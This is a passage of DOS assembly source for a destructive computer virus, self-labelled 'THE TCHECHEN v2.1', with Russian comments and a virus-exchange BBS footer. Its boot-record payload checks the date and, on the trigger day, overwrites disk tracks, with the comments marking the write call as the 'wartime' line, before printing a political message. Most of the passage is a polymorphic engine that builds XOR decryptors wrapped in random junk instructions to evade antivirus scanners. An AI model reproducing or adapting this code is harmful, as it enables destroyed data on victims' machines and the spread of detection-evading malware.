       PUSH AX			   ; Старт:     CS:0000
       XOR  AX,AX
       PUSH AX

       MOV DI,THEENDATALL-START		; Место назначения
       MOV CS:[DSTADDR-START],DI	; Для MAYHEM

       RETF				; вызов MAYHEM
AFTERMAYHEM:
       SMOV DS,CS			; выход из MAYHEM

       POP BX				; FileHandle- сохранен в начале проц.
       RETN
;─────────────────────────────────────────────────────────────────────────────
; Процедуры ──────────────────────────────────────────────────────────────────

RNDW PROC				; Результат: DX=RND(0..FFFF)
       IN  AL,40H
       MOV DH,AL
       IN  AL,40H
       MOV DL,AL
       RETN
RNDW ENDP

SCANBIOSNAME PROC		
			; На входе: bp= адрес строки имен для поиска
	PUSH AX CX SI DI ES DS
	MOV  AX,0F000H		; начиная с BIOS'а
	MOV  ES,AX
	XOR  DI,DI		; со смещения 0000

	PUSH CS
	POP  DS

	MOV  CX,0FFFFH		; как далеко искать
     SCANBIOS:
	PUSH DI CX		; сохраним CX - есть вложенный цикл
	MOV  SI,BP		; начало очередной строки поиска
	INC  SI			;
	XOR  CX,CX
	MOV  CL,BYTE PTR DS:[BP] ; размер строки перед строкой, пусть думают,
				 ; что это написано на Паскале !
	REPE CMPSB		; сравнивать DS:[SI] и ES:[DI]
				; до первого расхождения
	POP  CX DI
	JZ   EXITLOOP
	INC  DI			; ищем далее
	LOOP SCANBIOS
     EXITLOOP:
	POP  DS ES DI SI CX AX
	RETN
SCANBIOSNAME  ENDP

BACK13  PROC
	PUSH AX DI ES DS
	XOR  AX,AX
	MOV  DS,AX
	LES  DI,DWORD PTR CS:[OLD13-START]
	SES  DS:[0013H*4],DI
	POP  DS ES DI AX
	RETN
BACK13  ENDP


;--------------------------------------------------------------------------
MYMBR:		;MBRMBRMBRMBRMBRMBMBMBMBMBMBRMBRMBBMBRMBMBMBRMBRBRRRRRRRRR...
STARTMBR:
                CLD
                CLI
                XOR AX,AX
		MOV SS,AX
                MOV SP,07C00H
                MOV SI,SP
		MOV ES,AX
		MOV DS,AX
                STI
                MOV     DI,0600H
                MOV     CX,100H
                REPNE   MOVSW
                DB      0EAH            ; jmp far 0:61Dh
                DW      61DH, 0

	        MOV  SI,07BEH
  FINDBOOTABLE:
		CMP  BYTE PTR [SI],80H			; DS=0,?		
		JE   GOBOOT
		ADD  SI,10H
		JMP  FINDBOOTABLE
	GOBOOT:
		MOV  DX,[SI]
		MOV  CX,[SI][02]

                MOV  AX,0201H
		MOV  BX,07C00H
		INT  13H
RUSSIANROULETTE:
                PUSH AX CX DX
                MOV AH,04
                INT 1AH
                JC LUCKYUSER
CLOCKOK:
	DAYX__: CMP DL,10H
                POP DX CX AX
                JNZ HAPPYUSER

                JMP SHORT DIGITALWARFARE
LUCKYUSER:
                POP DX CX AX
HAPPYUSER:
                DB 0EAH
                DW 07C00H,0000
DIGITALWARFARE:
READPARTITION:

        SCANPARTITION:
                 MOV DL,80H
                 MOV SI,07BEH
                 MOV BH,80H                      ; Address to read

        ANOTHERDISK:
                 MOV DH,[SI+1]
                 MOV CX,[SI+2]
                 MOV DI,10                       ; TrackCount

        READTRACK:
                SECSCNT_ LABEL BYTE             ; Does CX,DX the same nexttime?

;======= DANGER ! DANGER ! DANGER ! =========================================
;               mov ax,0200h			; TEST VARIANT: Read  Sectors
		MOV AX,0300H			; WARTIME LINE: Write Sectors
						; Choose one of them
;============================================================================
                INT 13H

        NEXTHEAD:
                INC DH
                HEADCNT__ LABEL BYTE
                CMP DH,00
                JBE READTRACK

        NEXTTRACK:
                XOR DH,DH          ; since ZeroHead
                INC CH
                JNC M1
                ADD CL,00100000B   ; Tracks are CH(LowByte) and CL(Hi765Bits)
        M1:     DEC DI
                JNZ READTRACK

        NEXTDISK:
                ADD SI,10H
                CMP SI,07FEH
                JE  DONE
                CMP BYTE PTR [SI+4],00
                JE  NEXTDISK
                JMP ANOTHERDISK
        DONE:
        SAYEMALL:
                MOV AH,0EH
                MOV SI,OFFSET CRYPTOTEXT-STARTMBR+0600H
                MOV CX,OFFSET ENDTEXT-CRYPTOTEXT
        NEXTLETTER:
                LODSB
                XOR AL,40H
                INT 10H
                LOOP NEXTLETTER
                CLI
                HLT

CRYPTOTEXT DB ' HALF YEAR OF WAR HAS GONE. IT STILL DOES.',0DH,0AH
	   DB ' MASS MURDER WAS RECOGNIZED BY THE WORLD COMMUNITY.',0DH,0AH
	   DB ' ACCEPT MY CONGRATULATIONS ! ENJOY THE WORLD''S NEW ORDER !',0DH,0AH
	   DB ' THE TCHECHEN, v2.1 (C) RUSSIAN BEAR. 1995,JUNE',0DH,0AH
ENDTEXT:

FREESPACE       DB      (446-(OFFSET FREESPACE-STARTMBR)) DUP(0)

PARTTABLE:      DB      80H, 01H, 01H, 00H, 06H, 04H
                DB      0D1H,0CFH, 11H, 00H, 00H, 00H
                DB      0FFH, 43H, 01H
                DB      49 DUP (0)
SIGNATURE       DB      55H,0AAH
ENDALLMBR:

 DB 0DH,0AH
 DB ' И.Д.! Это уже не 1914, хотя и тот Тебя вовсю имел ! ',0DH,0AH
 DB ' Я обещал - похороны мира ПК начались! Танцуют все!',0DH,0AH
 DB ' Ты-РЕБЕНОК перед нами, юзера-ДЕТИ перед Тобой! Расскажи им сказку про ',0DH,0AH
 DB ' надежность WEB''a! Отец- герой! Самолюбие не пустит этот текст в List ! ',0DH,0AH
 DB ' А есть ли оно у автора такой попсы, как WEB ? Хочется верить. До встречи!',0

      BIOSNAMES       DB  10
      AMISTRING	      DB  'Megatrends'
		      DB  5
      AWARDSTR	      DB  'Award'

	OLD13         DW ?,?
	OLD01	      DW ?,?

;============================================================================
;------ Константы для MAYHEM ------------------------------------------------

	RECSIZE     EQU	 8	; TABLE RECORD STRUCTURE
	ADDRESS     EQU  0
	PLACE       EQU  2
	DISTANCE    EQU  3
	REALPLACE   EQU  4
	R_GROUP     EQU  5
	OPERAND     EQU  6

	R_AX	EQU  0		; REGISTER NUMBERS AS IN INSTRUCTIONS
	R_CX	EQU  1
	R_DX    EQU  2
	R_BX    EQU  3
	R_SP    EQU  4
	R_BP    EQU  5
	R_SI    EQU  6
	R_DI    EQU  7



 HOLLOW DB 16-((HOLLOW-START) MOD 16) DUP(90H)    ; Выравнивание до параграфа

; --------------------------------- ; ТОЧКА ВХОДА ; ------------------------
					          ; CS=DS, ES:DI=Destination
						  ; IP=0.
 MAYHEM:
	PUSH DI					  ; Адрес назначения
	MOV BYTE PTR DS:[R_USED-MAYHEM],00010000B ; Исключаем SP
       ;-----------------------------------------   Находим регистры для групп
	MOV SI,R_MASK-MAYHEM	 	   	  ; Адрес масок для групп
	MOV DI,R_GRP -MAYHEM                      ; Результат

    C1:	CMP BYTE PTR [SI],00			  ; Конец масок ?
	JZ  ENDFORM
						  ; Номер регистра
	MOV  DL,7				  ; RND(0..7) 
	CALL RND

	MOV CL,DL				  ; Представим в виде бита
	MOV AL,1                                  
	SHL AL,CL

   TSTUSED:
	TEST BYTE PTR DS:[R_USED-MAYHEM],AL	  ; Не занят другими ?
	JZ SUITTST
    TSTROL:					  ; От RND нужного сто лет
	INC DL	      				  ; не дождешься. Берем следу-
	ROL AL,1  				  ; ющий по счету регистр и...
	CMP DL,8       	        		
	JB TSTUSED
	XOR DL,DL				  ; дошли до края и - сначала
	JMP TSTUSED				  ; подразумевается, что один
						  ; свободный все-таки будет
    SUITTST:
	TEST BYTE PTR [SI],AL			  ; Никем не занят. А нам он
	JZ   TSTROL				  ; нужен такой ?

	MOV DS:[DI],DL				  ; Нашли регистр для группы
	OR  DS:[R_USED-MAYHEM],AL		  ; помечаем как занятый
	INC DI				
	INC SI
	JMP C1					  ; для следующей группы...	
    ENDFORM:

       ;------------------------------------  Каждому command'у - свое (место)
	MOV SI,MUTAB-MAYHEM	 	    ; Даза банных, где парится MAYHEM
    					    ; сканируем запись за записью 
   C2:	MOV  DL,[SI][DISTANCE]		    ; поле "разброс номера позиции"
	CALL RND			    ; Комманда отстоит на RND(0..Dist)
	ADD  DL,[SI][PLACE]		    ; ...от своего места
	MOV  [SI][REALPLACE],DL		    ; позиция комм. в формируемом коде
	ADD  SI,RECSIZE			    ; следующая запись 	
	CMP  WORD PTR [SI],0000		    ; конец записей ? 
	JNZ  C2

       ;--------------------------------  Приготовления закончены. Теперь
	                                ; соберем все и тогда начнется mayhem!

	POP DI  			; кто забыл ES:DI = МестоНазначения
	MOV AL,-1			; Счетчик позиций 
    
NXTNMB:	INC AL				    ; Следующая позиция 
	CMP AL,(ENDMUTAB-MUTAB)/RECSIZE-1   ; Все позиции размещены ?
	JA  EXITALLOC
					; Сканируем базу на предмет комманд с
	MOV SI,MUTAB-RECSIZE-MAYHEM	; позицией REALPLACE=AL
    NXTELEM:
	ADD SI,RECSIZE			; след. запись
	CMP WORD PTR [SI],0000		
	JE  NXTNMB                      ; конец базы? 

	CMP [SI][REALPLACE],AL	        ; совпали позиции ?
	JNE NXTELEM
					; ДОБАВЛЯЕМ КОММАНДУ + мусор
	PUSH AX			
	CALL DS:[SI]			; адрес процедуры для ДАННОЙ комманды
        CALL TRASHCHAIN                 ; генерируем цепочку мусора
        POP  AX
	JMP NXTELEM
EXITALLOC:
	JMP MAYHEM_OFF
;----------------------------------------------------------------------------
;---------------------------------------  Служебные процедуры MAYHEM  -------

    RND PROC			; DL= RND (0..DL)  Получить случайный байт
				; Обнуляет DH на выходе.
	PUSH AX CX BX			

	OR DL,DL		; RND(0..0)=0
	JZ EXRND

	INC DL			; для 0FFh не надо +1
	JNZ OKK			
	DEC DL
     OKK:
	MOV AX,0100H		; размер единичного отрезка
	DIV DL
	NOT AH			

	XCHG AL,DL		
	IN   AL,40H
	CMP  AL,AH		; Если RND больше, чем ЕдОтр*ВерхГран,
	JBE  OKK1		; то обрезаем до EдOтр*ВерхГран
	MOV  AL,AH
	OKK1:

	XOR AH,AH		; Делим полученный RND-байт на Единичн.Отрезок
	DIV DL
	MOV DL,AL
	XOR DH,DH		

	EXRND:
	POP BX CX AX
	RETN
    RND ENDP

;---------------------------------------------------------------------------
   TRASH PROC	; Добавляет к цепочке случайную комманду
		; По R_USED определяет незанятые регистры
		; ES:DI=место назначения
					
	PUSH AX SI
					; получим адрес одной из таблиц слу-
					; чайных комманд из T_CHAIN
	MOV  SI,T_CHAIN-MAYHEM		
	MOV  DL,(END_T_CHAIN-T_CHAIN)/2-1	; RND номер элемента T_CHAIN
	CALL RND
	SHL  DL,1			; *2_Байта	
	ADD  SI,DX			; [SI]  Здесь адрес одной из таблиц
	MOV  SI,[SI]			; Вот он

				  ; Берем случайную комманду из выбранной
				  ; таблицы. Таблица имеет заголовок:
				  ; кол-во комманд (CMDNUMB), размер комманды
				  ; в таблице(CMDSIZE) и CMDSTAT -байт статуса
	MOV DL,[SI][CMDNUMB]	    	
	CALL RND		  
	MOV AL,[SI][CMDSIZE]
	MUL DL
	MOV CL,[SI][CMDSTAT]
	ADD SI,AX			; SI=Адрес найденной нами комманды
					; CL=байт статуса комманды
	ADD SI,3			; SI=SI+3 (заголовок таблицы)

				; Теперь строим случайную комманду на основа-
				; нии байта статуса комманд этой таблицы

	TEST CL,CMD	        ; Комманда начинается с постоянного байта ?
	JZ   END_CMD
	CLD			; Добавляем в цепочку байт из DS:[SI]
	MOVSB
	END_CMD:

	TEST CL,CMDPLUS		; Добавить байт + номер регистра ?
	JZ  END_CMDPLUS

	MOV DL,7
	CALL RND		; Получаем номер регистра и проверяем его на
	TEST CL,REGCHNG		; занятость... 
	JZ END_SUITREG

	PUSH CX
	MOV  CL,DL
	MOV  AL,1
	SHL  AL,CL

   CONT_TST:
	TEST DS:[OFFSET R_USED-MAYHEM],AL
	JZ POP_END_SUITREG

	INC DL
	ROL AL,1
	CMP DL,8
	JB  CONT_TST
	XOR DL,DL
	JMP CONT_TST

     POP_END_SUITREG:
	POP CX
	END_SUITREG:

	TEST CL,PLUS8		; Нужно ли номер регистра множить на 8 ?
	JZ ADD1
      ADD8:		
	PUSH AX
	MOV AL,8
	MUL DL
	MOV DL,AL
	POP AX
      ADD1:
	ADD DL,[SI]
	MOV ES:[DI],DL
	INC DI
	END_CMDPLUS:

	TEST CL,RNDNUMB		; Нужно ли комманде случайное слово ?
	JZ END_ADDRND
	MOV DL,0FFH
	CALL RND
	MOV AL,DL
	MOV DL,0FFH
	CALL RND
	MOV DH,AL
	MOV ES:[DI],DX
	INC DI
	INC DI
	END_ADDRND:
	POP SI AX
	RETN
			
       ;-------------------------------------------------------------------
	T_CHAIN       DW OFFSET TAB0-MAYHEM	; Адреса таблиц RND комманд
		      DW OFFSET TAB1-MAYHEM
		      DW OFFSET TAB2-MAYHEM
		      DW OFFSET TAB3-MAYHEM
		      DW OFFSET TAB4-MAYHEM
		      DW OFFSET TAB5-MAYHEM
	END_T_CHAIN   DW 0000

       ;-------------------------------------------------------------------
       ;Константы:        
	CMDHDR  EQU 3		; Длина заголовка таблицы		
			        ; Смещения полей таблицы
	CMDNUMB EQU 0		;       Количество комманд
	CMDSIZE EQU 1		;       Размер комманды в таблице
	CMDSTAT EQU 2		;       Байт статуса

					; Формат байта статуса: 	
	CMD	EQU 00000001B		; CONST_BYTE
	CMDPLUS EQU 00000010B		; CONST_BYTE + REG_NO
	PLUS8   EQU 00000100B		; CONST_BYTE + REG_NO*8
	RNDNUMB EQU 00001000B		; + RND_WORD 
	REGCHNG EQU 10000000B		; меняет значения регистров
	PFXSEG  EQU 01000000B		; можно добавлять префикс сегмента

			;---------------- ТАБЛИЦЫ КОММАНД ----------------

	TAB0	DB (ENDTAB0-CMDS0)/01-1		; количество комманд
		DB 01				; размер элемента таблицы
		DB CMD				; байт статуса
	CMDS0:					; сами комманды
		CLD				
		STI
		NOP
	ENDTAB0:
	;-------------------------------------------------
	TAB1	DB (ENDTAB1-CMDS1)/01-1
		DB 01
		DB CMDPLUS+REGCHNG+PFXSEG
	CMDS1:
		INC AX
		DEC AX
	ENDTAB1:
	;-------------------------------------------------
	TAB2	DB (ENDTAB2-CMDS2)/2-1
		DB 02
		DB CMD+CMDPLUS+REGCHNG+PFXSEG
	CMDS2:
		NEG AX
		NOT AX
		ROL AX,1
		ROR AX,1
		RCR AX,1
		RCL AX,1
		SHL AX,1
		SHR AX,1
	ENDTAB2:
	;-------------------------------------------------

	TAB3	DB (ENDTAB3-CMDS3)/1-1
		DB 1
		DB CMDPLUS+RNDNUMB+REGCHNG+PFXSEG
	CMDS3:
		DB 0B8H		; mov ax
	ENDTAB3:
	;-------------------------------------------------

	TAB4	DB (ENDTAB4-CMDS4)/2-1
		DB 2
		DB CMD+CMDPLUS+RNDNUMB+PFXSEG+REGCHNG
	CMDS4:
		DB 81H,0F0H	; xor reg,imm
		DB 81H,0E8H	; sub reg,imm
		DB 81H,0C0H	; add reg,imm
		DB 81H,0E0H	; and reg,imm
		DB 81H,0C8H	; or  reg,imm
		DB 81H,0D0H	; adc reg,imm
		DB 81H,0D8H	; sbb reg,imm
	ENDTAB4:
	;-------------------------------------------------

	TAB5    DB (ENDTAB5-CMDS5)/2-1
		DB 2
		DB CMD+CMDPLUS+PLUS8+RNDNUMB+PFXSEG+REGCHNG
	CMDS5:
		DB 8BH,06H	; MOV REG,MEM
		DB 03H,06H      ; ADD REG,MEM
	ENDTAB5:
	;-------------------------------------------------

   ;	PFXTAB  DB 26h,2eh,36h,3eh		; префиксы сегментов

	TRASH ENDP
   ;-----------------------------------------------------------------------
    TRASHCHAIN PROC		; Добавляет к коду цепочку случайных комманд
	PUSH CX DX
	MOV  DL,08
	CALL RND
	XOR  DH,DH
	INC  DL
	MOV  CX,DX
MM1:	PUSH CX
        CALL ARTRASH            ; Одна процедура генерации мусора
	CALL TRASH		; Другая процедура генерации мусора
	POP CX
	LOOP MM1
	POP DX CX
        RETN
    TRASHCHAIN ENDP

;--- Процедура генерации арифметического мусора с байтовыми регистрами
;    Комманды:  MOV ADD ADC SUB SBB XOR TEST
;    Вид :      CONST+
;               (REG*8+RND(0..7))*(RND(0..3)*40h) +
;               [RNDbyte/RNDword/nothing]
;    Зависимость от 2го байта: 	  06+RND(0..7)*8  :  +WORD       
;                                 00..3F  другие  :  ничего   
;                                 40..7F          :  +BYTE        
;                                 80..BF          :  +WORD
;                                 C0..FF          :  ничего
;    Советую посмотреть комманды самим в HIEW etc.

ARTRASH PROC

        PUSH AX CX DX SI
	
	MOV CL,DS:[R_USED-MAYHEM]      ; Ести все из AX,CX,DX,BX заняты,-EXIT.
	AND CL,0FH
	CMP CL,0FH
	JE  NO_ADD

        MOV  SI,CMDS-MAYHEM	       ; Первые байты комманд
	MOV  DL,CMDSEND-CMDS-1	       ; Случайная комманда в пределах 
        CALL RND
	XOR  DH,DH
	ADD  SI,DX
	CLD			       ; заносим ее в цепочку
	LODSB			
        STOSB

        CALL GETFREEREG		       ; получаем свободный полурегистр
					
        MOV  AL,8
        MUL  DL			       ; REG*8

	MOV  DL,7		       ; + RND(0..7)
        CALL RND
        ADD  AL,DL

	PUSH AX			       ; + RND(0..3)*40H
	MOV  DL,3
	CALL RND
        MOV  AL,40H
	MUL  DL
	POP  DX
	ADD  AL,DL

        STOSB				; второй байт Done.
					; Нужны ли RND в конце комманды ?
	CMP  AL,06
	JE   ADD_W
	CMP  AL,0EH
	JE ADD_W
	CMP  AL,16H
	JE ADD_W
	CMP AL,1EH
	JE ADD_W
	CMP AL,26H
	JE ADD_W
	CMP AL,2EH
	JE ADD_W
	CMP AL,36H
	JE ADD_W
	CMP AL,3EH
	JE ADD_W
	CMP  AL,40H
	JB NO_ADD

        CMP  AL,80H
        JB   ADD_B
        CMP  AL,0C0H
        JAE  NO_ADD
    ADD_W:				; добавить случайное слово
        MOV DL,0FFH			
        CALL RND
	MOV AL,DL
        STOSB
    ADD_B:				; добавить случайный байт
        MOV DL,0FFH
        CALL RND
	MOV AL,DL
        STOSB
    NO_ADD:				; ничего не добавлять
        POP SI DX CX AX
        RETN
;--------------------------------------
CMDS    DB 8AH,32H,02H,1AH,12H,2AH,84H		; комманды
;          MOV XOR ADD SBB ADC SUB TEST
CMDSEND:
ARTRASH ENDP
;-----------------------------------------------------------------------
GETFREEREG PROC                      ; Возвращает номер свободного байтного
                                     ; регистра :  AL=Бит , DL=Номер
        MOV  DL,7
        CALL RND
        MOV  AL,1		     ; в виде бита
	MOV  CL,DL
        SHL  AL,CL
                                     ;                         BhChBlCl 
				     ; байт                    | | | |
	MOV  DH,DS:[R_USED-MAYHEM]   ; для байтных регистров:  76543210
                                     ;                          | | | |
                                     ;                          DhAhDlAl  
	MOV  CH,DH		     ; копируем биты 0..3 в 4..7
	AND  CH,0FH
	MOV  CL,4
	SHL  DH,CL
	ADD  CH,DH
	
  CONTTST:

	TEST AL,CH		      ; подходит ? 		
        JZ   GFR_DONE

        INC DL			      ; нет - сдвигаем и ищем дальше 	
        ROL AL,1
        CMP DL,8
        JB CONTTST
        XOR DL,DL
        JMP CONTTST
   GFR_DONE:			
        RETN
GETFREEREG ENDP
;-----------------------------------------------------------------------
;------------------- Процедуры настройки комманд -----------------------

				; SI  в начале каждой указывает на начало
				; записи в базе для данной комманды

    MOV_NUMBER PROC		; Формирует комманду  MOV Reg,Immed
				; Reg согласно группе, Immed из поля Operand
	CALL GETREG		; получить регистр по номеру группы
	ADD  AL,0B8H		; "MOV"
	STOSB
	MOV  AX,[SI][OPERAND]
	STOSW
	RETN
        MOV_NUMBER ENDP

    MOV_SEG_R1 PROC		; комманда MOV SegReg,Reg
				; здесь SegReg постоянен = ES
	CALL GETREG
	CBW			
	XCHG AH,AL
	ADD  AX,0C08EH
	STOSW
	RETN
    MOV_SEG_R1 ENDP

    MOV_KEY PROC			; "MOV es:[0200h..02FFh],Reg"
	MOV AX,8926H
	STOSW
	CALL GETREG
	MOV CL,3
	SHL AL,CL
	ADD AL,6
	STOSB				; REG*8+6

	MOV DL,0FFH			; Адрес вектора
	CALL RND
	ADD DX,0200H
	MOV DS:[TMPVEC-MAYHEM],DX	; Придется оттуда еще и вычитать
	MOV ES:[DI],DX
	INC DI
	INC DI
	RETN
    MOV_KEY ENDP

    SUB_KEY PROC		; SUB ES:[200..2FF],reg
				; вычитаем то же число из того же вектора
	MOV AX,2926H
	STOSW

	CALL GETREG
	MOV CL,3
	SHL AL,CL
	ADD AL,6	
	STOSB
	MOV AX,DS:[TMPVEC-MAYHEM]
	STOSW
	MOV AL,@PUSHF		; сохраним флаги, чтобы мусор их не попортил
	STOSB
	RETN
    SUB_KEY ENDP

    JMP_OK PROC			; JZ XOR_COMMAND
	MOV AL,@POPF
	STOSB
					; Переход на комманду расшифровки
					; Мы еще не знаем, куда    ┌┬┬┐ ┌──┐
	MOV DS:[FOR1-MAYHEM],DI		; Запомним адрес операнда  ├JZ┤ │??│
	INC BYTE PTR DS:[FOR1-MAYHEM]   ;                          └┴┴┘ └──┘ 
	MOV AX,0274H			; комманда JZ $+...(Пока 2)
	STOSW
	RETN
    JMP_OK ENDP

    INT20 PROC
	MOV AX,20CDH		; int 20h
	STOSW
	RETN
    INT20 ENDP

				; Формирователь комманды расшифровывания и 
				; настройка переходов на нее
    DEXOR PROC			; xor [],*
				; info:    XOR  [si],REG  =  31 , 04+08*REG
				;               [di],REG  =  31 , 05+08*REG
				;               [bx],REG  =  31 , 07+08*REG

				; Теперь известен операнд перехода на XOR
	MOV AX,DI		; адрес комманды XOR
	SUB AX,DS:[FOR1-MAYHEM] ; Расстояние JZ...XOR.
	DEC AX			
	MOV BX,DS:[FOR1-MAYHEM] ; Куда заносить операнд
	MOV ES:[BX],AL		; OK

	MOV DS:[OFFSET LBL1-MAYHEM],DI	     ; для настройки JMP цикла 

	MOV AL,@PFX_CS		; префикс CS:
	STOSB
				; Комманда оперирует двумя регистрами:
				; поле REG_GROUP - только для одного
				; Номера групп здесь помещены в OPERAND.
	MOV  BX,[SI][OPERAND]   ; Находим номер индексного регистра для XOR
	PUSH BX			; Он - в старшем байте слова Operand
	XCHG BL,BH
	XOR  BH,BH
	MOV  AL,[BX][R_GRP-MAYHEM]

	MOV  AH,4		; 4,5,или 7  в зависимости от SI,DI,BX
	CMP  AL,R_SI
	JE   LB1
	INC  AH
	CMP  AL,R_DI
	JE   LB1
	ADD  AH,02
	LB1:

	POP BX			; регистр с ключом для XORа
	XOR BH,BH
	MOV AL,[BX][R_GRP-MAYHEM]
	MOV CL,3		; x8 + (4,5 или 7)
	SHL AL,CL
	ADD AH,AL

	MOV AL,31H		; 2-байтовая комманда XOR [IndexReg],Reg
	STOSW
	RETN
    DEXOR ENDP

    INC_CNT PROC                ; Инкремент словного регистра
	CALL GETREG
	ADD  AL,40H
	STOSB
	RETN
    INC_CNT ENDP

    DEC_CNT PROC		; Декремент словного регистра
	CALL GETREG
	ADD AL,48H
	STOSB
	RETN
    DEC_CNT ENDP

    DEC_CNT_PUSHF PROC		; Декремент словного регистра и PUSHF
	CALL GETREG
	ADD  AL,48H
	STOSB
	MOV AL,@PUSHF
	STOSB
	RETN
    DEC_CNT_PUSHF ENDP

    JMP_CONT PROC		; Формирование условного перехода на продолже-
				; ние XOR'а или выхода.
	MOV AL,@POPF
	STOSB
	MOV AX,0374H		; Выход из цикла
	STOSW
	MOV AL,0E9H		; Переход опять на XOR
	STOSB

	MOV AX,DS:[LBL1-MAYHEM] 	; настройка перехода на XOR
	SUB AX,DI
	SUB AX,2		
	STOSW
	RETN
    JMP_CONT  ENDP

    END_VIR  PROC		; переход на тело вируса
	CALL MOV_NUMBER		; здесь: MOV REG,offset StartDecrypted
	CALL PUSHER		; здесь: PUSH REG
	MOV AL,0C3H		; Инструкция RETN
	STOSB
	RETN
    END_VIR ENDP

    ADD_DISP PROC		; ADD Reg(XORKEY), Смещение_XORа
	CALL GETREG
	CBW
	XCHG AH,AL
	ADD  AX,0C081H
	STOSW
	MOV  AX,[SI+OPERAND]	; операнд - смещение ключа для XOR
	STOSW
	RETN
    ADD_DISP ENDP

  QUEUE PROC			; трик с конвейером
	MOV  AX,0C72EH		; MOV CS:[След_Комманда],JMP_к_матери
	STOSW
	MOV  AL,06H
	STOSB

	MOV  AX,DS:[VARSRC-MAYHEM]
	ADD  AX,INIT-START+4	
	ADD  AX,DI
	SUB  AX,DS:[DSTADDR-MAYHEM]
	STOSW
	MOV  AX,084EBH		; JMP_к_матери
	STOSW
	MOV  AX,9090H		; они будут заменены на JMP_к_матери
	STOSW
	RETN
  QUEUE ENDP

;------------------------------  общие процедуры настройки комманд  --------

    GETREG PROC				; находит и возвращает номер регистра
					; данной группы для данного поля базы
	XOR  BH,BH
	MOV  BL,[SI][R_GROUP]
	MOV  AL,[BX][R_GRP-MAYHEM]	; результат
	RETN
    GETREG ENDP

    PUSHER PROC				; добавляет инструкцию PUSH
	CALL GETREG
	ADD  AL,50H
	STOSB
	RETN
    PUSHER ENDP

; -------------------  MUTABLE : База данных MAYHEM  -----------------------

	; ------------ Образец расшифровщика ---------------
	; N  Границы   Комманда
        ; -  ----      ----------------------------- 
	; 0  0..7      MOV CS:[NEXTCOMMAND],MAD_CODE 
	; 1  0..7      MOV SI,OFFSET CRYPTED
	; 2  0..7      mov cx,(offset ENDCRYPTED-CRYPTED)/2
	; 3  0..5      mov dx,XORKEY
	; 4  0..4      mov ax,0000
	; 5     5      mov es,ax
	; 6   	6      mov es:[0200h],dx
	; 7     7      sub es:[0200h],dx
	;	       pushf
	; 8	8      popf
	;	       jz  Okay
	; 9     9      lazha: int 20h
	; 	       okay:
	; A     A      xor cs:[si],dx
	; B  B..F      inc si
	; C  B..F      inc si
	; D  B..D      dec cx
	; E  E..F      dec cx
	;      	       pushf
	; F  B..F      add dx,XORdis
	; 10   10      popf
	;	       jnc okay
	; 11   11      retn
	
MUTAB:						
					; Элемент "Трюк с конвейером"
	DW QUEUE-MAYHEM			; Адрес настройщика
	DB 00,07,00			; С позиции 0 до позиции 7
					; реальное положение будет определено
	DB 00                           ; Регистровая группа 0
DSTADDR	DW ?				; ENTRY DI    Операнд. Переменная 
					; инит-ся до входа в MAYHEM.

 	DW MOV_NUMBER-MAYHEM		; MOV SI,offset CRYPTED
	DB 00,07,00
	DB 00
VARSRC	DW ?				; смещение шифрованного в новой копии

	DW MOV_NUMBER-MAYHEM		; MOV CX,(ENDCRYPTED-CRYPTED)/2
	DB 00,07,00
	DB 01
	DW INIT-START			; размер вируса

	DW MOV_NUMBER-MAYHEM		; mov dx,XORKEY
	DB 00,05,00
	DB 02
VARXOR	DW ?

	DW MOV_NUMBER-MAYHEM		; mov ax,0000
	DB 00,04,00
	DB 03
	DW 0000

	DW MOV_SEG_R1-MAYHEM		; mov es,ax
	DB 05,00,00
	DB 03
	DW ?

	DW MOV_KEY-MAYHEM		; mov es:[0200..0300],dx
	DB 06,00,00
	DB 02
	DW ?

	DW SUB_KEY-MAYHEM		; sub es:[0200..0300],dx
	DB 07,00,00
	DB 02
	DW ?

	DW JMP_OK-MAYHEM		; jz $+?
	DB 08,00,00
	DB 0FFH
	DW 0004

	DW INT20-MAYHEM			; int  20h
	DB 09,0,0
	DB 00
	DW 0000

	DW DEXOR-MAYHEM			; xor [*],*
	DB 0AH,00,00
	DB 0FFH				; группа 0FFh (условно) -
	DW 0002				; в опреанде 2 регистра:Low=SRC,Hi=DST

	DW INC_CNT-MAYHEM		; inc address
	DB 0BH,04,00
	DB 00
	DW ?

	DW DEC_CNT-MAYHEM		; dec size
	DB 0BH,02,00
	DB 01
	DW ?

	DW INC_CNT-MAYHEM		; inc address ( две комманды INC:  +2)
	DB 0BH,04,00
	DB 00
	DW ?

	DW DEC_CNT_PUSHF-MAYHEM  	; dec size \ PUSHF
	DB 0EH,00,00
	DB 01
	DW ?

	DW ADD_DISP-MAYHEM		; ADD XorKey,XorDispl
	DB 0BH,04,00
	DB 02
VARDIS	DW ?				; смещение для ключа XOR

	DW JMP_CONT-MAYHEM		; продолжение цикла
	DB 10H,00,00
	DB ?
	DW ?

	DW END_VIR-MAYHEM		; переход на расшифрованное тело
	DB 11H,00,00
	DB 00		
VARRETF	DW ?				; адрес начала тела для перехода

	ENDMUTAB DW 0000		; конец базы данных MAYHEM	

	R_USED DB 00010000B		; Флаг использованных регистров

	R_MASK DB 11001000B		; Гр.0 (индексные регистры)
	       DB 11101111B		; Гр.1 (все регистры, кроме SP)
               DB 11101111B             ; Гр.2
	       DB 11101111B             ; Гр.3
	       DB 0			; конец таблицы масок

	R_GRP  DB 8 DUP(0) 		; результат закрепления регистров за
					; каждой группой

	LBL1   DW ?			; адрес начала комманды XOR
	FOR1   DW ?			; адрес пустующего операнда JMP
        TMPVEC DW ?			; пишем/читаем в вектор из IntTable 

MAYHEM_OFF:				; КОНЕЦ СКАЗОЧКЕ...
	RETF
;----------------------------------------------------------------------------
	DB  (OFFSET INIT-START) MOD 2+2 DUP(90H)	;  ADJUST TO EVEN
;------ Здесь находится расшифровщик (будет сформирован MAYHEM'ом) ----------
INIT:
	JMP  START
; ─────────────────────────────────────────────────────────────────────────────
INFSIGN  DB 14H,38H,00
				; ДАННЫЕ ВНЕ ТЕЛА ВИРУСА 
ENDALL:
OUTSIDEDATA:
		ORIGINAL    DB 3 DUP(?)		; начало обрабатываемого файла	
DISKSECTOR:					; MBR
		EXEHDRCONT  DB 15H DUP(?)       ; 
		OFFS400	    DW ?		; 'NE' при проверке WinEXE
		FLEN        DW ?,?		;  Длина, размер файла
		FSIZE       DW ?,?
		CURRDISK    DB ?		; Номер диска

		BODYPREPARE DW (INIT-START)/2 DUP(?)	; для шифровки тела
THEENDATALL:
END START0

; ─────────────────────────────────────────────────────────────────────────
; ──────────────── Remember Where You Saw This Phile First ────────────────
; ───────[=] ARRESTED DEVELOPMENT +31.77.3547477 The Netherlands [=]───────
; ─────────────────────────────────────────────────────────────────────────
